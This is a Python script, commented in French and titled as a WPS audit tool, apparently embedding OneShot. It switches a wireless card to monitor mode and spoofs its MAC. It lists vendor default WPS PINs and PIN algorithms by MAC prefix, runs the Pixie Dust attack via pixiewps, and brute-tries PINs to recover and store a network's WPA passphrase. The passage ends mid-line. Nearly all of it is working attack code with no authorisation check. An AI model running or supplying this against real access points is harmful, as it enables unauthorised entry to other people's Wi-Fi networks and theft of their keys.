#!/usr/bin/env python3
"""
WPS Audit — Script unique intégrant OneShot
Usage : sudo python3 wps_audit.py [options]
"""

import argparse
import codecs
import collections
import csv
import os
import pathlib
import re
import shutil
import signal
import socket
import statistics
import subprocess
import sys
import tempfile
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple


IFACE         = "wlan0"
IFACE_MON     = "wlan0mon"
WASH_DURATION = 20
SCRIPT_DIR    = Path(__file__).resolve().parent


# ─────────────────────────────────────────────────────────────────────────────
#  COULEURS / LOGGER
# ─────────────────────────────────────────────────────────────────────────────

class _C:
    if sys.stderr.isatty():
        RED="\033[0;31m"; GREEN="\033[0;32m"; YELLOW="\033[1;33m"
        BLUE="\033[0;34m"; CYAN="\033[0;36m"; MAGENTA="\033[0;35m"
        BOLD="\033[1m"; DIM="\033[2m"; RESET="\033[0m"
    else:
        RED=GREEN=YELLOW=BLUE=CYAN=MAGENTA=BOLD=DIM=RESET=""

C = _C()

def _ts():        return time.strftime("%H:%M:%S")
def log_info(m):  print(f"{C.BLUE}[i]{C.RESET} {_ts()} {m}",   file=sys.stderr)
def log_ok(m):    print(f"{C.GREEN}[✓]{C.RESET} {_ts()} {m}",  file=sys.stderr)
def log_warn(m):  print(f"{C.YELLOW}[!]{C.RESET} {_ts()} {m}", file=sys.stderr)
def log_error(m): print(f"{C.RED}[✗]{C.RESET} {_ts()} {m}",   file=sys.stderr)
def log_step(m):  print(f"{C.MAGENTA}[>]{C.BOLD} {_ts()} {m}{C.RESET}", file=sys.stderr)
def log_cmd(cmd): print(f"{C.DIM}[*] {' '.join(cmd)}{C.RESET}", file=sys.stderr)
def log_debug(m):
    if os.environ.get("DEBUG") == "1":
        print(f"{C.DIM}[DBG] {m}{C.RESET}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────────────────────
#  PROCESS REGISTRY
# ─────────────────────────────────────────────────────────────────────────────

_procs: List[subprocess.Popen] = []
_plock = threading.Lock()

def _reg(p):
    with _plock: _procs.append(p)

def _unreg(p):
    with _plock:
        try: _procs.remove(p)
        except ValueError: pass

def _kill_all():
    with _plock:
        for p in list(_procs):
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
                p.wait(timeout=2)
            except Exception:
                try: p.kill()
                except Exception: pass
        _procs.clear()

def _run(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except FileNotFoundError:
        return 127, "", f"{cmd[0]}: not found"
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"

def _run_show(cmd: List[str]) -> subprocess.CompletedProcess:
    log_cmd(cmd)
    return subprocess.run(cmd, capture_output=True, text=True)


# ─────────────────────────────────────────────────────────────────────────────
#  GESTION INTERFACE
# ─────────────────────────────────────────────────────────────────────────────

def get_monitor_interface() -> Optional[str]:
    out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
    current_iface = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            current_iface = line.split()[1]
        elif line.startswith("type monitor") and current_iface:
            return current_iface
    return None


def enable_monitor_mode(iface: str) -> str:
    log_step(f"Activation mode monitor sur {iface}")
    existing = get_monitor_interface()
    if existing:
        log_ok(f"Monitor déjà actif : {existing}")
        _fix_mon_mac(existing)
        return existing

    r1 = _run_show(["airmon-ng", "check", "kill"])
    if r1.stdout.strip(): log_info(r1.stdout.strip()[:200])
    time.sleep(2)

    r2 = _run_show(["airmon-ng", "start", iface])
    if r2.stdout.strip(): log_info(r2.stdout.strip()[:200])
    time.sleep(3)

    mon = get_monitor_interface()
    if not mon:
        log_error("Monitor interface not found")
        sys.exit(1)

    log_ok(f"Monitor: {mon}")
    _fix_mon_mac(mon)
    return mon


def disable_monitor_mode(mon_iface: str) -> None:
    log_step(f"Désactivation monitor : {mon_iface}")
    r1 = _run_show(["airmon-ng", "stop", mon_iface])
    if r1.stdout.strip(): log_info(r1.stdout.strip()[:200])
    time.sleep(2)
    log_info("Restart NetworkManager → restaure wlan0...")
    _run_show(["systemctl", "restart", "NetworkManager"])
    time.sleep(4)
    rc, _, _ = _run(["ip", "link", "show", IFACE])
    if rc == 0:
        log_ok(f"{IFACE} restauré ✓")
    else:
        time.sleep(5)
        if _run(["ip", "link", "show", IFACE])[0] == 0:
            log_ok(f"{IFACE} restauré ✓")
        else:
            log_warn(f"{IFACE} toujours absent")


def _fix_mon_mac(iface_mon: str):
    _, out, _ = _run(["ip", "link", "show", iface_mon])
    m = re.search(r"ether\s+([0-9a-f:]{17})", out)
    mac = m.group(1) if m else None
    if not mac or mac == "00:00:00:00:00:00":
        import random
        new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
            random.randint(0, 255) for _ in range(5)
        )
        _run(["ip", "link", "set", iface_mon, "down"])
        _run(["ip", "link", "set", iface_mon, "address", new_mac])
        _run(["ip", "link", "set", iface_mon, "up"])
        time.sleep(1)
        log_info(f"MAC {iface_mon} corrigée : {new_mac}")


def kill_interfering_processes() -> None:
    log_info("Arrêt des processus interférants (NM, wpa_supplicant)...")
    for proc in ["NetworkManager", "wpa_supplicant"]:
        _run(["pkill", "-9", "-x", proc])
    time.sleep(2)
    log_ok("Processus interférants arrêtés ✓")


def restore_network() -> None:
    log_info("Restauration NetworkManager...")
    _run_show(["systemctl", "restart", "NetworkManager"])
    time.sleep(4)
    rc, _, _ = _run(["ip", "link", "show", IFACE])
    if rc == 0:
        log_ok(f"{IFACE} restauré — connexion internet OK ✓")
    else:
        log_warn(f"{IFACE} pas encore visible (NM en cours...)")


# ─────────────────────────────────────────────────────────────────────────────
#  ONESHOT INTÉGRÉ
# ─────────────────────────────────────────────────────────────────────────────

class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self): return self._str_repr
    @string.setter
    def string(self, v): self._str_repr = v; self._int_repr = self._mac2int(v)
    @property
    def integer(self): return self._int_repr
    @integer.setter
    def integer(self, v): self._int_repr = v; self._str_repr = self._int2mac(v)
    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, o): self.integer += o
    def __isub__(self, o): self.integer -= o
    def __eq__(self, o): return self.integer == o.integer
    def __ne__(self, o): return self.integer != o.integer
    def __lt__(self, o): return self.integer < o.integer
    def __gt__(self, o): return self.integer > o.integer
    @staticmethod
    def _mac2int(mac): return int(mac.replace(':', ''), 16)
    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))


class WPSpin:
    def __init__(self):
        self.ALGO_MAC    = 0
        self.ALGO_EMPTY  = 1
        self.ALGO_STATIC = 2
        self.algos = {
            'pin24':     {'mode': self.ALGO_MAC,    'gen': self.pin24},
            'pin28':     {'mode': self.ALGO_MAC,    'gen': self.pin28},
            'pin32':     {'mode': self.ALGO_MAC,    'gen': self.pin32},
            'pinDLink':  {'mode': self.ALGO_MAC,    'gen': self.pinDLink},
            'pinDLink1': {'mode': self.ALGO_MAC,    'gen': self.pinDLink1},
            'pinASUS':   {'mode': self.ALGO_MAC,    'gen': self.pinASUS},
            'pinAirocon':{'mode': self.ALGO_MAC,    'gen': self.pinAirocon},
            'pinEmpty':  {'mode': self.ALGO_EMPTY,  'gen': lambda m: ''},
            'pinCisco':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 1234567},
            'pinBrcm1':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 2017252},
            'pinBrcm2':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 4626484},
            'pinBrcm3':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 7622990},
            'pinBrcm4':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 6232714},
            'pinBrcm5':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 1086411},
            'pinBrcm6':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 3195719},
            'pinAirc1':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 3043203},
            'pinAirc2':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 7141225},
            'pinDSL2740R':{'mode':self.ALGO_STATIC, 'gen': lambda m: 6817554},
            'pinRealtek1':{'mode':self.ALGO_STATIC, 'gen': lambda m: 9566146},
            'pinRealtek2':{'mode':self.ALGO_STATIC, 'gen': lambda m: 9571911},
            'pinRealtek3':{'mode':self.ALGO_STATIC, 'gen': lambda m: 4856371},
            'pinUpvel':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 2085483},
            'pinUR814AC':{'mode': self.ALGO_STATIC, 'gen': lambda m: 4397768},
            'pinUR825AC':{'mode': self.ALGO_STATIC, 'gen': lambda m: 529417},
            'pinOnlime': {'mode': self.ALGO_STATIC, 'gen': lambda m: 9995604},
            'pinEdimax': {'mode': self.ALGO_STATIC, 'gen': lambda m: 3561153},
            'pinThomson':{'mode': self.ALGO_STATIC, 'gen': lambda m: 6795814},
            'pinHG532x': {'mode': self.ALGO_STATIC, 'gen': lambda m: 3425928},
            'pinH108L':  {'mode': self.ALGO_STATIC, 'gen': lambda m: 9422988},
            'pinONO':    {'mode': self.ALGO_STATIC, 'gen': lambda m: 9575521},
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty': return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getLikely(self, mac):
        res = self._suggest(mac)
        return self.generate(res[0], mac) if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D','0E5D4E','107BEF','14A9E3','28285D','2A285D',
                      '32B2DC','381766','404A03','4E5D4E','5067F0','5CF4AB',
                      '6A285D','8E5D4E','AA285D','B0B2DC','C86C87','CC5D4E',
                      'CE5D4E','EA285D','E243F6','EC43F6','EE43F6','F2B2DC',
                      'FCF528','FEF528','4C9EFF','0014D1','D8EB97','1C7EE5',
                      '84C9B2','FC7516','14D64D','9094E4','BCF685','C4A81D',
                      '00664B','087A4C','14B968','2008ED','346BD3','4CEDDE',
                      '786A89','88E3AB','D46E5C','E8CD2D','EC233D','ECCB30',
                      'F49FF3','20CF30','90E6BA','E0CB4E'),
            'pin28': ('200BC7','4846FB','D46AA8','F84ABF'),
            'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C',
                      '802689','908D78','E8CC18','2CAB25','10BF48','14DAE9',
                      '3085A9','50465D','5404A6','C86000','F46D04','801F02'),
            'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386',
                         'C0A0BB','CCB255','FC7516','0014D1','D8EB97'),
            'pinDLink1':('0018E7','00195B','001CF0','001E58','002191','0022B0',
                         '002401','00265A','14D64D','1C7EE5','340804','5CD998',
                         '84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1'),
            'pinASUS': ('049226','04D9F5','08606E','107B44','10BF48','10C37B',
                        '14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A',
                        '382C4A','38D547','40167E','50465D','54A050','6045CB',
                        '60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E',
                        'AC220B','AC9E17','B06EBF','BCEE7B','D017C2','D850E6',
                        'E03F49','F832E4','00177C','001EA6','048D38','081077',
                        '081078','081079','083E5D','181E78','1C4419','2420C7',
                        '247F20','2CAB25','3C1E04','40F201','44E9DD','48EE0C',
                        '5464D9','54B80A','64517E','64D954','6C198F','6C7220',
                        '6CFDB9','7C2664','84A423','88A6C6','8C10D4','904D4A',
                        '907282','94FBB2','A01B29','ACA213','B85510','B8EE0E',
                        'BC3400','BC9680','C891F9','D084B0','E4BEED','EC4C4D',
                        'F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8',
                        '78542E','C412F5','C4A81D','E8CC18','EC2280'),
            'pinAirocon':('0007262F','000B2B4A','000EF4E7','00177C','001AEF',
                          '00E04BB3','02101801','788C54','803F5DF6','94FBB2',
                          'BC9680','F43E61','FC8B97'),
            'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B',
                         '802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF',
                         '20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872',
                         '788102','7894B4','D460E3','E06066','004A77','2C957F',
                         '64136C','74A78E','88D274','702E22','74B57E','789682',
                         '7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53',
                         '709F2D','94A7B7','981333','CAA366','D0608C'),
            'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995',
                         'E0CB4E','7054F5'),
            'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B',
                         'EC6264'),
            'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685',
                         'C8BE19'),
            'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19',
                         '7C034C'),
            'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685',
                         'C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB',
                         '18622C','7C03D8','D86CE9'),
            'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685',
                         'C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB',
                         '18622C','7C03D8','D86CE9'),
            'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685',
                         'C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB',
                         '18622C','7C03D8','D86CE9'),
            'pinAirc1': ('181E78','40F201','44E9DD','D084B0'),
            'pinAirc2': ('84A423','8C10D4','88A6C6'),
            'pinDSL2740R':('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516'),
            'pinRealtek1':('0014D1','000C42','000EE8'),
            'pinRealtek2':('007263','E4BEED'),
            'pinRealtek3':('08C6B3',),
            'pinUpvel':  ('784476','F8C091'),
            'pinUR814AC':('D4BF7F60',),
            'pinUR825AC':('D4BF7F5',),
            'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
            'pinEdimax': ('801F02','00E04C'),
            'pinThomson':('002624','4432C8','88F7C7','CC03FA'),
            'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED',
                          '2469A5','346BD3','786A89','88E3AB','9CC172','ACE215',
                          'D07AB5','CCA223','E8CD2D','F80113','F83DFF'),
            'pinH108L':  ('4C09B4','4CAC0A','9CD24B','B075D5','C864C7','DC028E',
                          'FCC897'),
            'pinONO':    ('5C353B','DC537C'),
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin&0xF)<<4)+((pin&0xF)<<8)+((pin&0xF)<<12)+
                ((pin&0xF)<<16)+((pin&0xF)<<20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i%6]+b[5]) % (10-(i+b[1]+b[2]+b[3]+b[4]+b[5])%7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        return (((b[0]+b[1])%10)+(((b[5]+b[0])%10)*10)+
                (((b[4]+b[5])%10)*100)+(((b[3]+b[4])%10)*1000)+
                (((b[2]+b[3])%10)*10000)+(((b[1]+b[2])%10)*100000)+
                (((b[0]+b[1])%10)*1000000))


def _get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''; self.pkr = ''; self.e_hash1 = ''
        self.e_hash2 = ''; self.authkey = ''; self.e_nonce = ''

    def clear(self): self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce
                and self.authkey and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        cmd = (f"pixiewps --pke {self.pke} --pkr {self.pkr}"
               f" --e-hash1 {self.e_hash1} --e-hash2 {self.e_hash2}"
               f" --authkey {self.authkey} --e-nonce {self.e_nonce}")
        if full_range: cmd += ' --force'
        return cmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''; self.last_m_message = 0
        self.essid = ''; self.wpa_psk = ''

    def isFirstHalfValid(self): return self.last_m_message > 5
    def clear(self): self.__init__()


class Companion:
    """Moteur WPS OneShot intégré — corrigé pour la reconnexion après Pixie Dust."""

    def __init__(self, interface: str, print_debug: bool = False,
                 save_result: bool = False):
        self.interface   = interface
        self.print_debug = print_debug
        self.save_result = save_result
        self.lastPwr     = 0

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf',
                                         delete=False) as temp:
            temp.write(f'ctrl_interface={self.tempdir}\n'
                       f'ctrl_interface_group=root\nupdate_config=1\n')
            self.tempconf = temp.name

        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self._start_wpa_supplicant()

        self.res_socket_file = (
            f"{tempfile._get_default_tempdir()}/"
            f"{next(tempfile._get_candidate_names())}"
        )
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds       = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir  = str(SCRIPT_DIR) + '/reports/'

        for d in [self.sessions_dir, self.pixiewps_dir]:
            os.makedirs(d, exist_ok=True)

        self.generator = WPSpin()

    def _start_wpa_supplicant(self):
        """Lance wpa_supplicant et attend que le socket de contrôle soit prêt."""
        print('[*] Running wpa_supplicant…')
        cmd = (f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired'
               f' -i{self.interface} -c{self.tempconf}')
        self.wpas = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding='utf-8', errors='replace'
        )
        deadline = time.time() + 15
        while time.time() < deadline:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                out = self.wpas.communicate()[0]
                raise ValueError(f'wpa_supplicant error: {out[:200]}')
            if os.path.exists(self.wpas_ctrl_path):
                return
            time.sleep(0.1)
        raise TimeoutError('wpa_supplicant socket not ready after 15s')

    def _restart_wpa_supplicant(self):
        """
        Redémarre wpa_supplicant proprement entre deux connexions.
        CRITIQUE pour éviter WSC_NACK sur la 2ème tentative après Pixie Dust.
        """
        print('[*] Restarting wpa_supplicant for clean connection…')

        # 1. arrêter le processus actuel
        try:
            self.wpas.terminate()
            self.wpas.wait(timeout=5)
        except Exception:
            try: self.wpas.kill()
            except Exception: pass

        # 2. fermer et recréer le socket de contrôle
        try: self.retsock.close()
        except Exception: pass

        # 3. nettoyer le socket de contrôle wpa_supplicant
        try: os.remove(self.wpas_ctrl_path)
        except FileNotFoundError: pass

        # 4. attendre que l'interface se libère
        time.sleep(3)

        # 5. recréer le socket de retour
        self.res_socket_file = (
            f"{tempfile._get_default_tempdir()}/"
            f"{next(tempfile._get_candidate_names())}"
        )
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        # 6. relancer wpa_supplicant
        self._start_wpa_supplicant()
        print('[*] wpa_supplicant restarted ✓')
        time.sleep(1)

    def sendOnly(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, _) = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    def __handle_wpas(self, pixiemode=False, pbc_mode=False,
                      verbose=None, bssid=""):
        if not verbose: verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose: sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f'[*] [{self.lastPwr}] Sending WPS Message M{n}…')
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print(f'[*] [{self.lastPwr}] Received WPS Message M{n}')
                if n == 5: print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print(f'[*] [{self.lastPwr}] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = _get_hex(line)
                assert len(self.pixie_creds.e_nonce) == 32
                if pixiemode: print(f'[P] E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = _get_hex(line)
                if pixiemode: print(f'[P] PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = _get_hex(line)
                if pixiemode: print(f'[P] PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = _get_hex(line)
                assert len(self.pixie_creds.authkey) == 64
                if pixiemode: print(f'[P] AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = _get_hex(line)
                assert len(self.pixie_creds.e_hash1) == 64
                if pixiemode: print(f'[P] E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = _get_hex(line)
                assert len(self.pixie_creds.e_hash2) == 64
                if pixiemode: print(f'[P] E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(
                    _get_hex(line)
                ).decode('utf-8', errors='replace')

        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print(f'[*] [{self.lastPwr}] Scanning…')

        elif 'WPS-FAIL' in line and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')

        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode(
                    "'".join(line.split("'")[1:-1]), 'unicode-escape'
                ).encode('latin1').decode('utf-8', errors='replace')
            print(f'[*] [{self.lastPwr}] Authenticating…')

        elif 'Authentication response' in line:
            print(f'[*] [{self.lastPwr}] Authenticated')

        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode(
                    "'".join(line.split("'")[1:-1]), 'unicode-escape'
                ).encode('latin1').decode('utf-8', errors='replace')
            print(f'[*] [{self.lastPwr}] Associating with AP…')

        elif 'Associated with' in line and self.interface in line:
            bssid_line = line.split()[-1].upper()
            if self.connection_status.essid:
                print(f'[+] [{self.lastPwr}] Associated with {bssid_line}'
                      f' (ESSID: {self.connection_status.essid})')
            else:
                print(f'[+] [{self.lastPwr}] Associated with {bssid_line}')

        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f'[*] [{self.lastPwr}] Sending EAPOL Start…')

        elif 'EAP entering state IDENTITY' in line:
            print(f'[*] [{self.lastPwr}] Received Identity Request')

        elif 'using real identity' in line:
            print(f'[*] [{self.lastPwr}] Sending Identity Response…')

        elif bssid.lower() in line.lower() and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print(f'[*] [{self.lastPwr}] Running Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd: print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip()
                    return '' if pin == '<empty>' else pin
        return False

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False,
                         verbose=None):
        if not verbose: verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)  # vider le pipe

        print(f"[*] Trying PIN '{pin}'…")
        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print('[!] WPS command failed')
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose,
                                     bssid=bssid.lower())
            if not res: break
            if self.connection_status.status in ('WSC_NACK','GOT_PSK','WPS_FAIL'):
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False,
                          showpixiecmd=False, pixieforce=False,
                          store_pin_on_fail=False):
        """
        Lance une connexion WPS.
        Après Pixie Dust : RESTART wpa_supplicant avant la connexion finale.
        C'est le fix du WSC_NACK sur la 2ème tentative.
        """
        if not pin:
            if pixiemode:
                filename = (self.pixiewps_dir
                            + f"{bssid.replace(':', '').upper()}.run")
                try:
                    with open(filename, 'r') as f:
                        t_pin = f.readline().strip()
                    ans = input(f'[?] Use previously calculated PIN {t_pin}? [n/Y] ')
                    pin = t_pin if ans.lower() != 'n' else None
                    if not pin: raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            else:
                pin = '12345670'

        # première connexion (Pixie Dust ou directe)
        self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            # succès !
            print(f"[+] WPS PIN: '{pin}'")
            print(f"[+] WPA PSK: '{self.connection_status.wpa_psk}'")
            print(f"[+] AP SSID: '{self.connection_status.essid}'")
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid,
                                  pin, self.connection_status.wpa_psk)
            return True

        elif pixiemode:
            if self.pixie_creds.got_all():
                found_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if found_pin:
                    print(f'[*] Pixiewps found PIN: {found_pin}')
                    print('[*] Restarting wpa_supplicant for clean reconnection…')
                    # ── FIX CRITIQUE : restart complet avant la 2ème connexion ──
                    self._restart_wpa_supplicant()
                    # ── Connexion finale avec le PIN calculé ──────────────────
                    return self.single_connection(
                        bssid=bssid,
                        pin=found_pin,
                        pixiemode=False,
                        store_pin_on_fail=True,
                    )
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False

        else:
            if store_pin_on_fail:
                filename = (self.pixiewps_dir
                            + f"{bssid.replace(':', '').upper()}.run")
                with open(filename, 'w') as f:
                    f.write(pin)
                print(f'[i] PIN saved in {filename}')
            return False

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        filename = self.reports_dir + 'stored'
        dateStr  = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
                    f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        writeHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeHeader:
                w.writerow(['Date','BSSID','ESSID','WPS PIN','WPA PSK'])
            w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])

    def cleanup(self):
        try:
            self.sendOnly('TERMINATE')
        except Exception: pass
        try: self.retsock.close()
        except Exception: pass
        try: self.wpas.terminate(); self.wpas.wait(timeout=3)
        except Exception:
            try: self.wpas.kill()
            except Exception: pass
        try: os.remove(self.res_socket_file)
        except Exception: pass
        try: shutil.rmtree(self.tempdir, ignore_errors=True)
        except Exception: pass
        try: os.remove(self.tempconf)
        except Exception: pass

    def __del__(self):
        try: self.cleanup()
        except Exception: pass


# ─────────────────────────────────────────────────────────────────────────────
#  SCANNER WPS (wash)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class WPSTarget:
    bssid:   str
    channel: str
    rssi:    str
    wps_ver: str
    locked:  bool
    vendor:  str
    essid:   str

    @property
    def rssi_int(self) -> int:
        try: return int(self.rssi)
        except ValueError: return -99

    @property
    def signal_bar(self) -> str:
        v = self.rssi_int
        if v >= -60: return f"{C.GREEN}████{C.RESET}"
        if v >= -70: return f"{C.GREEN}███ {C.RESET}"
        if v >= -80: return f"{C.YELLOW}██  {C.RESET}"
        return f"{C.RED}█   {C.RESET}"


_BSSID_RE  = re.compile(
